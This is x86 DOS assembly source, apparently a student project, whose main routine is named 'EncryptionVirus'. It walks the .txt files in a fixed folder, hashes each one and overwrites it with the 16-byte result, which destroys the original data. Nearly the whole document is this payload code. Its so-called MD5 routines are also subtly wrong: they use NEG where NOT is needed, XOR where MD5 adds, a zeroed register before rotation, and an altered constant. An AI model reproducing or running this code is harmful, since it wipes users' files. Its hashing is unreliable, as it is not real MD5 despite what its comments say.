Include irvine16.inc

FileControlBlock struc 	;File Data
db 22 dup(?) 			;header info 
FileTime dw ? 			;time stamp of file
FileDate dw ? 			;date stamp of file
FileSize dd ? 			;size of file
FileName db 64 dup(0) 	;name of file found by DOS
FileControlBlock ends

.DATA
FolderPath db "C:\N\*.txt",0 	;Path of search folder
DTA FileControlBlock <>			;Point the file data struct to user-defined DTA
FileHandle dw ?
BufferSize = 64					;To read 512-bit per time (64 byte)
FileFullPath db 260 DUP(?),0	;File full path after adding name found by DOS to it
Buffer db bufferSize dup(0),0	;Buffer to read data from file to it
CurrentSize dw 0				;Indicator to file size to be used in padding (step in MD5)
TotalSize dword 0				;To count how many characters remaon
RotationIndex Byte 0			;Index to Rotation array to indicate number of rotations per round
TIndex DWord 0					;Index to T array to use per round
K DWord 0

A DWord 01234567h
B DWord 89ABCDEFh
E DWord 0FEDCBA98h
D DWord 78543210h

T DWord 0D76AA478h,0E8C7B756h,242070DBh,0C1BDCEEEh,0F75C0FAFh,4787C62Ah,0A8304613h,0FD469501h,698098D8h,8B44F7AFh,0FFFF5BB1h,895CD7BEh,6B901122h,0FD987193h,0A679438Eh,49B40821h
  DWord 0F61E2562h,0C040B340h,265E5A51h,0E9B6C7AAh,0D62F105Dh,02441453h,0D8A1E681h,0E7D3FBC8h,21E1CDE6h,0C33707D6h,0F4D50D87h,455A14EDh,0A9E3E905h,0FCEFA3F8h,676F02D9h,8D2A4C8Ah
  DWord 0FFFA3942h,8771F681h,699D6122h,0FDE5380Ch,0A4BEEA44h,4BDECFA9h,0F6BB4B60h,0BEBFBC70h,289B7EC6h,0EAA127FAh,0D4EF3085h,04881D05h,0D9D4D039h,0E6DB99E5h,1FA27CF8h,0C4AC5665h
  DWord 0F4292244h,432AFF97h,0AB9423A7h,0FC93A039h,655B59C3h,8F0CCC92h,0FFEFF47Dh,85845DD1h,6FA87E4Fh,0FE2CE6E0h,0A3014314h,4E0811A1h,0F7537E82h,0BD3AF235h,2AD7D2BBh,0EB86D391h

Rotation Byte 7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22
		 Byte 5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20
		 Byte 4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23
		 Byte 6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21
			  
HashedData DWord 4 DUP(?)

			  
.CODE

;----------------------------------------------------------------------------
;Get first file with specific extension from the given folder
;Recieves: SI contain offset of the path to search in
;Returns Data of first file found
;----------------------------------------------------------------------------
FindFirstFile PROC
mov AH,1Ah						;Set DTA
mov DX,offset DTA				;point DX to DTA returned by OS
int 21h

mov AH , 4Eh					;Dos function search for 1st matching file
mov CX , 1						;Normal attribute
mov DX , SI
int 21h    
JC Quit                             ; call Dos
RET
FindFirstFile ENDP

;----------------------------------------------------------------------------
;Get next file with specific extension from the given folder
;Recieve Nothing
;Returns Data of current file found
;----------------------------------------------------------------------------
FindNextFile PROC
mov AH, 4Fh
int 21h
JC Quit
RET
FindNextFile ENDP

;----------------------------------------------------------------------------
;append file name to the folder path
;Recieve: SI contain offset of folder path
;		: DI contain offset that will contain file full path
;Returns FileFullPath contains the full path of file including file name
;----------------------------------------------------------------------------
GetFilePath PROC USES ECX
inc DI
mov dx,di

CopyPath:					;Copy folder path into FileFullPath var
CMP Byte Ptr [SI],'*'
JE Break
mov AL,[SI]
mov [DI],AL
inc SI
inc DI
JMP CopyPath

Break:
mov SI,offset DTA.FileName

AppendFileName:						;Append file name to file full path
cmp Byte Ptr [SI],0
je Break1
mov AL,[SI]
mov [DI],AL
inc SI
inc DI
JMP AppendFileName
Break1:
RET
GetFilePath ENDP

;----------------------------------------------------------------------------
;Open current found file
;Recieve: DX contain offset of file path
;Returns Nothing
;----------------------------------------------------------------------------
OpenFile PROC USES EAX
inc DX
mov AH,3Dh			;Open file
mov AL,2			;Choose the input mode(2 to read&write)
int 21h
JC Quit
mov FileHandle,AX
RET
OpenFile ENDP

;----------------------------------------------------------------------------
;Read current opened file
;Recieve: Nothing
;Returns AX conatains number of bytes retrieved from the file 
;----------------------------------------------------------------------------
ReadFile PROC USES ECX EDX
mov AH,3Fh  ;Read from file
mov CX,  BufferSize		;Number of bytes to read 
mov DX,offset Buffer                                              
int 21h  
JC Quit
RET
ReadFile ENDP

;----------------------------------------------------------------------------
;Write file data after hashing in the same file
;Recieve: SI contain offset of array contains final A,B,C,D
;		: DX conatain offset of the file full path
;Returns Nothing
;----------------------------------------------------------------------------
WriteEncryptedData PROC USES EAX ECX EBX

mov AH , 3Ch			;If the file already exist overwrite data in it, If file not exist create it
mov CX , 0				;Normal attribute
int 21h
JC Quit
mov dx,si
mov AH , 40h			;Write data to file
mov CX , 16				;To write 128-bit returned from Md5
mov BX , FileHandle
int 21h
JC Quit
mov AH , 3Eh			;Close File
int 21h
RET
WriteEncryptedData ENDP

;----------------------------------------------------------------------------
;Multpliy two numbers
;Recieves: EDI Contains the first number
;		 : K Contains the second number
;Returns : EDI Contains the result of the multiplication
;----------------------------------------------------------------------------
Multiply PROC USES ECX
mov ECX,EDI
L:
ADD EDI,K
LOOP L
RET
Multiply ENDP

;----------------------------------------------------------------------------
;The First Funnction of MD5 Encryption (F(B,E,D)=(B AND E) OR (NOT B AND D)
;Recieves: Values of B,E,D
;Returns EBX Contains the value returned form the equation
;----------------------------------------------------------------------------
F PROC USES ECX
mov EBX,B
AND EBX,E	;EBX=(B AND E)
mov ECX,B
neg ECX
AND ECX,D	;ECX=(NOT B AND D)
OR EBX,ECX
RET
F ENDP

;----------------------------------------------------------------------------
;The Second Funnction of MD5 Encryption (G(B,E,D)=(B AND D) OR (E AND NOT D)
;Recieves: Values of B,E,D
;Returns EDX Contains the value returned form the equation
;----------------------------------------------------------------------------
G PROC USES EBX
mov EBX,B
AND EBX,D	;EBX= (B AND D)
mov EDX,D
neg EDX
AND EDX,E	;EDX=(E AND NOT D)
OR EDX,EBX
RET
G ENDP

;----------------------------------------------------------------------------
;The Third Funnction of MD5 Encryption (H(B,E,D)=B XOR E XOR D
;Recieves: Values of B,E,D
;Returns EAX Contains the value returned form the equation
;----------------------------------------------------------------------------
H PROC
mov EAX,B
XOR EAX,E	;EAX=(B XOR E)
XOR EAX,D
RET
H ENDP

;----------------------------------------------------------------------------
;The Fourth Funnction of MD5 Encryption (I(B,E,D)=E XOR (B OR NOT D)
;Recieves: Values of B,E,D
;Returns ECX Contains the value returned form the equation
;----------------------------------------------------------------------------
I PROC USES EBX
mov ECX,E
mov EBX,D
neg EBX
OR EBX,B	;EBX=(B OR NOT D)
XOR ECX,EBX
RET
I ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5 
;Recieves: EAX Contains result of one of the four encryption functions.
;		 : EBX Contains 32-bit block of data from current 512 bit block.
;		 : IterationIndex Conatins the index of the current round.
;Returns (Modify) the values of the four variables A,B,E,D
;----------------------------------------------------------------------------
MD5 PROC USES EDX ECX

XOR EAX,A							;EAX=(EAX XOR A)
XOR EAX,EBX							;EAX=(EAX XOR EBX)
PUSH ESI
mov ESI,TIndex
XOR EAX,T[ESI]						;EAX=(EAX XOR Table)
movsx ESI, RotationIndex
mov EAX,0
mov CL,Rotation[ESI]
ROL AL,CL				;EAX=(EAX Rotated)
POP ESI
XOR EAX,B							;EAX=(EAX XOR B)

mov EDX,D
mov A,EDX
mov EDX,E
mov D,EDX
mov EDX,B
mov E,EDX
mov B,EAX

RET
MD5 ENDP

;----------------------------------------------------------------------------
;The Funnction of MD5Controller 
;Recieves:Nothing
;Returns :Nothing
;----------------------------------------------------------------------------
MD5Controller PROC USES EAX EBX ECX EDX ESI EDI
mov Rotationindex,0
mov TIndex,0

mov ECX,16
FCall:
PUSH EAX
PUSH EBX
mov EAX,0
mov BX,WORD PTR K
mov AX,BX
ADD AX,BX
ADD AX,BX
ADD AX,BX
mov SI,offset BUFFER
ADD SI,AX
POP EBX
POP EAX
INC K
Call F
mov EAX,EBX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
LOOP FCall
;------------------------------------------------------------------------------------
mov K,0
mov ECX,16
GCall:
mov EDI,5
Call Multiply
mov K,EDI
ADD K,1
mov K,EAX
mov EDX,0
mov EBX,16
DIV EBX
mov K,EDX
PUSH AX
PUSH EBX
mov EAX,0
mov BX,WORD PTR K
mov AX,BX
ADD AX,BX
ADD AX,BX
ADD AX,BX
mov SI,offset BUFFER
ADD SI,AX
POP EBX
POP AX
Call G
mov EAX,EDX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
LOOP GCall
;-------------------------------------------------------------------------------


mov K,0
mov ECX,16
HCall:
mov EDI,3
Call Multiply
mov K,EDI
ADD K,5
mov K,EAX
mov EDX,0
mov EBX,16
DIV EBX
mov K,EDX
PUSH AX
PUSH EBX
mov EAX,0
mov BX,WORD PTR K
mov AX,BX
ADD AX,BX
ADD AX,BX
ADD AX,BX
mov SI,offset BUFFER
ADD SI,AX
POP EBX
POP AX
Call H
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
LOOP HCall
;-----------------------------------------------------------------------------
mov K,0
mov ECX,16
ICall:
mov EDI,7
Call Multiply
mov K,EDI
mov K,EAX
mov EDX,0
mov EBX,16
DIV EBX
mov K,EDX
PUSH AX
PUSH EBX
mov EAX,0
mov BX,WORD PTR K
mov AX,BX
ADD AX,BX
ADD AX,BX
ADD AX,BX
mov SI,offset BUFFER
ADD SI,AX
POP EBX
POP AX
PUSH ECX
Call I
mov EAX,ECX
mov EBX,[SI]
Call MD5
INC RotationIndex
ADD TIndex,TYPE T
POP ECX
LOOP ICall	
;-------------------------------------------------------------------------
RET
MD5Controller ENDP

;--------------------------------------------------------------------------
;Clear part of the buffer
;Recieves : CurrentSize containsnumber of last read bytes
;Returns  : Buffer contains 0s only
;--------------------------------------------------------------------------
ClearBuffer PROC USES ECX EDI EBX
mov ECX,0
mov CX,BufferSize
Sub CX,CurrentSize
cmp CX,0
je Ext
mov BX,CurrentSize
mov DI,offset Buffer
ADD DI,BX
mov BX,0

Clear:
mov BL,00h
mov [DI],BL
inc DI
LOOP Clear
Ext:
RET
ClearBuffer ENDP

;----------------------------------------------------------------------------------------------------------
;Padding Function (Last Step Of Md5)
;Append 1-bit=1 after data , 64-bit contain file size at the end of buffer and the rest between them is 0's
;Recieves : CurrentSize contains number of last read bytes
;Returns  : Buffer Padded
;----------------------------------------------------------------------------------------------------------
Padding PROC USES ESI EBX
Call ClearBuffer
mov SI,offset Buffer
ADD SI,CurrentSize
CMP CurrentSize,55
JBE OneBuffer

CMP CurrentSize,64
JB TwoBuffers

Call MD5Controller
Call ClearBuffer
mov BL,80h
mov SI,offset Buffer
OR [SI],BL
JMP AppendSize

TwoBuffers:
mov BL,80h
OR [SI],BL
mov CurrentSize,0
Call MD5Controller
Call ClearBuffer
JMP AppendSize

OneBuffer:
mov BL,80h
OR [SI],BL

AppendSize:
mov SI , offset Buffer
add SI,60
mov EBX,DTA.FileSize
mov [SI],EBX
Call MD5Controller

RET
Padding ENDP

;----------------------------------------------------------------------------
;Rest Data of array Filefullpath
;Recieves : EAX
;Returns  : Nothing
;---------------------------------------------------------------------------
ResetData PROC USES EAX
mov DI,offset FileFullPath
mov CX,LENGTHOF FileFullPath
mov EAX,0
Target:
mov [DI],AL
inc DI
loop Target
mov TotalSize,0
mov A,01234567h
mov B,89ABCDEFh
mov E,0FEDCBA98h
mov D,78543210h
ret
ResetData ENDP
;----------------------------------------------------------------------------
;The Main Controller of the project to call all functions
;Recieves: Nothing
;Returns : Nothing
;----------------------------------------------------------------------------
EncryptionVirus PROC
mov SI , offset FolderPath
Call FindFirstFile

EncryptFiles:
mov SI , offset FolderPath
mov DI ,offset FileFullPath
Call GetFilePath


mov DX,offset filefullpath

Call OpenFile

			
mov BX,FileHandle  
ReadData:
mov EAX,0
Call ReadFile       
add TotalSize,EAX
mov CurrentSize , AX
mov EAX,TotalSize
CMP  EAX, DTA.FileSize
JE EndOfFile
Call MD5Controller                                                               
JMP ReadData

EndOfFile:
Call Padding

PUSH EAX
mov EAX,A
mov HashedData[0],EAX
mov EAX,B
mov HashedData[4],EAX
mov EAX,E
mov HashedData[8],EAX
mov EAX,D
mov HashedData[12],EAX
POP EAX

mov AH , 3Eh			;Close file
int 21h

mov SI,offset HashedData
mov DX,offset FileFullPath
inc dx

Call WriteEncryptedData

call ResetData
Call FindNextFile
JMP EncryptFiles

RET
EncryptionVirus ENDP

main PROC
mov AX,@data		;Initialize Data segment
mov DS,AX
Call EncryptionVirus
Quit::
.EXIT 
main ENDP
END main